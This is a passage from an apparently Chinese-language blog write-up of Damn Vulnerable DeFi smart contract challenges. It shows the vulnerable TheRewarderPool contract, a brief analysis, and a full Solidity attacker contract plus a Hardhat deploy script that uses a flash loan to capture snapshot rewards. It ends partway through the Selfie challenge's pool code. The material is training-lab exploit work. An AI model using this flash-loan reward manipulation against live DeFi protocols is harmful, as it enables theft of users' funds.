keyword\">import</span> <span class=\"token string\">\"./RewardToken.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableToken.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./AccountingToken.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title TheRewarderPool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TheRewarderPool</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token comment\">// Minimum duration of each round of rewards in seconds</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">constant</span> REWARDS_ROUND_MIN_DURATION <span class=\"token operator\">=</span> <span class=\"token number\">5</span> days<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> lastSnapshotIdForRewards<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> lastRecordedSnapshotTimestamp<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> lastRewardTimestamps<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Token deposited into the pool by users</span>\n    DamnValuableToken <span class=\"token keyword\">public</span> immutable liquidityToken<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Token used for internal accounting and snapshots</span>\n    <span class=\"token comment\">// Pegged 1:1 with the liquidity token</span>\n    AccountingToken <span class=\"token keyword\">public</span> accToken<span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">// Token in which rewards are issued</span>\n    RewardToken <span class=\"token keyword\">public</span> immutable rewardToken<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Track number of rounds</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> roundNumber<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Assuming all three tokens have 18 decimals</span>\n        liquidityToken <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableToken</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        accToken <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AccountingToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rewardToken <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RewardToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_recordSnapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amountToDeposit<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amountToDeposit <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must deposit tokens\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        accToken<span class=\"token punctuation\">.</span><span class=\"token function\">mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amountToDeposit<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">distributeRewards</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>\n            liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amountToDeposit<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amountToWithdraw<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        accToken<span class=\"token punctuation\">.</span><span class=\"token function\">burn</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amountToWithdraw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amountToWithdraw<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">distributeRewards</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> rewards <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isNewRewardsRound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">_recordSnapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>        \n        \n        <span class=\"token builtin\">uint256</span> totalDeposits <span class=\"token operator\">=</span> accToken<span class=\"token punctuation\">.</span><span class=\"token function\">totalSupplyAt</span><span class=\"token punctuation\">(</span>lastSnapshotIdForRewards<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> amountDeposited <span class=\"token operator\">=</span> accToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOfAt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> lastSnapshotIdForRewards<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>amountDeposited <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> totalDeposits <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            rewards <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>amountDeposited <span class=\"token operator\">*</span> <span class=\"token number\">100</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">**</span> <span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> totalDeposits<span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>rewards <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">_hasRetrievedReward</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> rewards<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                lastRewardTimestamps<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">return</span> rewards<span class=\"token punctuation\">;</span>     \n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_recordSnapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span>\n        lastSnapshotIdForRewards <span class=\"token operator\">=</span> accToken<span class=\"token punctuation\">.</span><span class=\"token function\">snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        lastRecordedSnapshotTimestamp <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n        roundNumber<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_hasRetrievedReward</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n            lastRewardTimestamps<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> lastRecordedSnapshotTimestamp <span class=\"token operator\">&amp;&amp;</span>\n            lastRewardTimestamps<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> lastRecordedSnapshotTimestamp <span class=\"token operator\">+</span> REWARDS_ROUND_MIN_DURATION\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isNewRewardsRound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">>=</span> lastRecordedSnapshotTimestamp <span class=\"token operator\">+</span> REWARDS_ROUND_MIN_DURATION<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-4\"><a href=\"#analyze-4\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>题目提供闪电贷功能，借出合约全部的钱再deposit()即可设置reward金额。</p>\n<p>进行deposit后会立即计算并且分配奖励。</p>\n<p>再withdraw转回满足flashloan()中的require条件。</p>\n<h2 id=\"attack-4\"><a href=\"#attack-4\" class=\"headerlink\" title=\"attack\"></a>attack</h2><p>attackcontract</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">DamnValuableToken1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">FlashLoanerPool1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">TheRewarderPool1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">RewardToken1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">RewarderAttacker</span> <span class=\"token punctuation\">&#123;</span>\n\n    DamnValuableToken1 <span class=\"token keyword\">public</span> immutable damnValuableToken<span class=\"token punctuation\">;</span>\n    FlashLoanerPool1 <span class=\"token keyword\">private</span> immutable flashLoanpool<span class=\"token punctuation\">;</span>\n    TheRewarderPool1 <span class=\"token keyword\">private</span> immutable rewarderPool<span class=\"token punctuation\">;</span>\n    RewardToken1 <span class=\"token keyword\">public</span> immutable rewardToken<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> attacker<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> flashLoanPoolAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> rewarderPoolAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> rewardTokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> attackerAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        damnValuableToken <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableToken1</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        flashLoanpool <span class=\"token operator\">=</span> <span class=\"token function\">FlashLoanerPool1</span><span class=\"token punctuation\">(</span>flashLoanPoolAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rewarderPool <span class=\"token operator\">=</span> <span class=\"token function\">TheRewarderPool1</span><span class=\"token punctuation\">(</span>rewarderPoolAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rewardToken <span class=\"token operator\">=</span> <span class=\"token function\">RewardToken1</span><span class=\"token punctuation\">(</span>rewardTokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        attacker <span class=\"token operator\">=</span> attackerAddress<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        flashLoanpool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Take a flash loan of DVT, deposit to rewarder pool, call distributeRewards and collect reward, withdraw DVT</span>\n    <span class=\"token comment\">// send reward token to the attacker, return DVT</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>rewarderPool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">,</span> rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        damnValuableToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> RewarderAttackerfactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'RewarderAttacker'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> attackerContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> RewarderAttackerfactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>flashLoanPool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            attacker<span class=\"token punctuation\">.</span>address\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"evm_increaseTime\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// wait 5 days</span>\n        <span class=\"token keyword\">await</span> attackerContract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_LENDER_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"6-Selfie\"><a href=\"#6-Selfie\" class=\"headerlink\" title=\"6.Selfie\"></a>6.Selfie</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.</p>\n<p>Wow, and it even includes a really fancy governance mechanism to control it.</p>\n<p>What could go wrong, right ?</p>\n<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p></blockquote>\n<h2 id=\"SelfiePool-code\"><a href=\"#SelfiePool-code\" class=\"headerlink\" title=\"SelfiePool code\"></a>SelfiePool code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./SimpleGovernance.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title SelfiePool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SelfiePool</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">;</span>\n\n    ERC20Snapshot <span class=\"token keyword\">public</span> token<span class=\"token punctuation\">;</span>\n    SimpleGovernance <span class=\"token keyword\">public</span> governance<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">FundsDrained</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> receiver<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">onlyGovernance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>governance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Only governance can execute this action\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> governanceAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        token <span class=\"token operator\">=</span> <span class=\"token function\">ERC20Snapshot</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        governance <span class=\"token operator\">=</span> <span class=\"token function\">SimpleGovernance</span><span class=\"token punctuation\">(</span>governanceAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> borrowAmount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token 